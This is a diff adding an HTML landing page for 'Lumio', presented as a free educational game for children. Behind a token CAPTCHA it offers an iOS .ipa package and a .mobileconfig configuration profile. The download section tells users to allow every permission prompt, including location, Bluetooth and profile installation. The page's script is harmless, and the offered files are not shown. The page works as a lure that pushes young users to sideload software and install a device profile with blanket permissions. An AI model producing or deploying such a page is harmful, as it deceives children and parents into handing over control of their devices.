@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LUMIO — The Best Free Learning App for Gamer Kids</title>
+    <style>
+        :root {
+            --bg: #0b0f19;
+            --card: #131a2a;
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --text: #f8fafc;
+            --muted: #94a3b8;
+            --border: #1e293b;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); line-height: 1.6; }
+        header { background: rgba(11, 15, 25, 0.9); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+        .nav-container { max-width: 1100px; margin: 0 auto; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: 1px; color: var(--accent); }
+        nav a { color: var(--text); text-decoration: none; margin-left: 1.5rem; font-weight: 500; }
+        nav a:hover { color: var(--accent); }
+        section { max-width: 1000px; margin: 0 auto; padding: 4rem 1.5rem; }
+        .hero { text-align: center; padding-top: 5rem; padding-bottom: 4rem; }
+        .hero h1 { font-size: 3rem; font-weight: 900; margin-bottom: 1rem; color: #818cf8; }
+        .hero .subtitle { font-size: 1.4rem; font-weight: 600; color: var(--text); margin-bottom: 1rem; }
+        .hero p { max-width: 680px; margin: 0 auto 2rem auto; color: var(--muted); }
+        .cta-btn { display: inline-block; background: var(--accent); color: white; padding: 0.9rem 2rem; border-radius: 10px; text-decoration: none; font-weight: 700; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 2rem; margin-bottom: 2rem; }
+        h2 { font-size: 1.85rem; margin-bottom: 1rem; color: #e2e8f0; }
+        p { color: var(--muted); margin-bottom: 1rem; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin-top: 1.5rem; }
+        .feature-box { background: rgba(255,255,255,0.02); border: 1px solid var(--border); padding: 1.5rem; border-radius: 12px; }
+        .captcha-box { background: #0f172a; border: 1px solid #334155; padding: 1.25rem; border-radius: 10px; max-width: 420px; margin: 1.5rem 0; }
+        .captcha-row { display: flex; align-items: center; gap: 10px; margin-top: 0.75rem; }
+        input[type="text"], input[type="email"], textarea { width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #334155; background: #0b0f19; color: white; margin-bottom: 1rem; }
+        button { background: var(--accent); color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 8px; font-weight: 700; cursor: pointer; }
+        button:disabled { background: #334155; cursor: not-allowed; opacity: 0.6; }
+        .notice-box { background: rgba(99, 102, 241, 0.12); border-left: 4px solid var(--accent); padding: 1rem; border-radius: 6px; color: #e2e8f0; margin: 1rem 0; }
+        footer { border-top: 1px solid var(--border); padding: 2.5rem 1.5rem; text-align: center; color: var(--muted); font-size: 0.85rem; background: #070a12; }
+        footer p { max-width: 800px; margin: 0.4rem auto; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="nav-container">
+            <div class="logo">LUMIO</div>
+            <nav>
+                <a href="#home">Home</a>
+                <a href="#about">About Us</a>
+                <a href="#contact">Contact Us</a>
+                <a href="#download">Download</a>
+            </nav>
+        </div>
+    </header>
+    <section id="home" class="hero">
+        <h1>LUMIO</h1>
+        <div class="subtitle">The best free learning app perfect for gamer kids.</div>
+        <p>Turn screen time into skill time. Lumio transforms math, logic, and problem-solving lessons into fast-paced arcade adventures—dodge obstacles, solve determinants, and level up your brain while having fun.</p>
+        <a href="#download" class="cta-btn">Get Lumio Free</a>
+    </section>
+
+    <section id="about">
+        <div class="card">
+            <h2>About Us</h2>
+            <p>Built by <strong>Nexora Interactive Technologies</strong>, Lumio was created with one simple mission: education should feel as exciting as your favorite video game. Every lesson in Lumio is an interactive game level designed to challenge young minds.</p>
+            <div class="grid">
+                <div class="feature-box">
+                    <h3>🎮 Game-Based Lessons</h3>
+                    <p>Master linear algebra, determinants, and critical thinking through high-speed runner challenges.</p>
+                </div>
+                <div class="feature-box">
+                    <h3>⚡ 100% Free to Play</h3>
+                    <p>Zero paywalls and zero hidden fees—accessible learning built for students everywhere.</p>
+                </div>
+                <div class="feature-box">
+                    <h3>🛡️ Safe & Transparent</h3>
+                    <p>Designed with clear permission prompts and full user control over device features.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="download">
+        <div class="card">
+            <h2>Download Lumio</h2>
+            <p>Complete the quick security verification below to unlock the official Lumio package and configuration profile.</p>
+            <div class="notice-box">
+                <strong>Important Setup Instructions:</strong> When opening the app and installing the configuration profile, <strong>please allow all requests and permission prompts</strong> (including Location, Bluetooth, Motion, and Profile Installation in Settings) so that all game features, device diagnostics, and syncing work properly.
+            </div>
+            <div class="captcha-box">
+                <label for="captchaInput"><strong>Human Verification (CAPTCHA):</strong></label>
+                <p id="captchaQuestion" style="margin-top: 0.4rem; color: #38bdf8; font-weight: bold;"></p>
+                <div class="captcha-row">
+                    <input type="text" id="captchaInput" placeholder="Enter answer..." style="margin-bottom: 0;">
+                    <button type="button" onclick="verifyCaptcha()">Verify</button>
+                </div>
+                <p id="captchaStatus" style="margin-top: 0.5rem; font-size: 0.85rem;"></p>
+            </div>
+            <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-top: 1rem;">
+                <button id="downloadAppBtn" disabled onclick="startDownload('lumio-ios.ipa')">📱 Download Lumio App (iOS)</button>
+                <button id="downloadProfileBtn" disabled onclick="startDownload('lumio-lab.mobileconfig')">⚙️ Download Setup Profile (.mobileconfig)</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact">
+        <div class="card">
+            <h2>Contact Us</h2>
+            <p>Have questions about Lumio or Nexora Interactive Technologies? Send our team a message below.</p>
+            <form onsubmit="event.preventDefault(); alert('Thank you! Your message has been sent to Nexora Interactive Technologies.'); this.reset();">
+                <input type="text" placeholder="Your Name" required>
+                <input type="email" placeholder="Your Email Address" required>
+                <textarea rows="4" placeholder="How can we help you?" required></textarea>
+                <button type="submit">Send Message</button>
+            </form>
+        </div>
+    </section>
+
+    <footer>
+        <p><strong>Copyright &copy; 2026 Nexora Interactive Technologies, Lumio.</strong></p>
+        <p>Lumio is owned by Nexora Interactive Technologies. All rights reserved, no part of this website, app and/or other stuff inside Nexora Interactive Technologies can be copied by any way.</p>
+    </footer>
+
+    <script>
+        let num1 = Math.floor(Math.random() * 9) + 1;
+        let num2 = Math.floor(Math.random() * 9) + 1;
+        let correctAnswer = num1 + num2;
+        document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
+
+        function verifyCaptcha() {
+            const userVal = parseInt(document.getElementById("captchaInput").value, 10);
+            const status = document.getElementById("captchaStatus");
+            if (userVal === correctAnswer) {
+                status.style.color = "#10b981";
+                status.innerText = "✅ Verified! Download buttons unlocked.";
+                document.getElementById("downloadAppBtn").disabled = false;
+                document.getElementById("downloadProfileBtn").disabled = false;
+            } else {
+                status.style.color = "#ef4444";
+                status.innerText = "❌ Incorrect answer. Please try again.";
+                num1 = Math.floor(Math.random() * 9) + 1;
+                num2 = Math.floor(Math.random() * 9) + 1;
+                correctAnswer = num1 + num2;
+                document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
+            }
+        }
+
+        function startDownload(filename) {
+            const link = document.createElement("a");
+            link.href = filename;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
